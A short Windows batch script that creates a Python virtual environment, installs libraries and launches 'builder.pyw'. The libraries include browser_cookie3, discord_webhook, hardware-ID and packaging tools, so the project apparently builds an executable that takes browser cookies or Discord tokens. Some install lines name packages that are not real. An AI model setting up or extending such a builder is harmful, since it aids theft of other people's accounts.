@echo off
echo Creating and activating virtual environment...

REM Create a virtual environment in the "env" folder
python -m venv env

REM Check if the virtual environment was created successfully
IF EXIST "env\Scripts\activate.bat" (
    REM Activate the virtual environment
    call env\Scripts\activate.bat
) ELSE (
    echo Failed to create virtual environment.
    pause
    exit /b 1
)

echo Installing required Python libraries...

pip install requests
pip install pycryptodome
pip install pystyle
pip install colorama
pip install auto_py_to_exe
pip install pyinstaller
pip install wmi
pip install pyOpenSSL
pip install OpenSSL
pip install get-mac
pip install psutil
pip install ctypes
pip install Crypto.Cipher
pip install fade
pip install discord
pip install browser_cookie3
pip install discord_webhook

echo All libraries installed. Now running setup.py...

REM Execute the setup.py file
python builder.pyw

pause
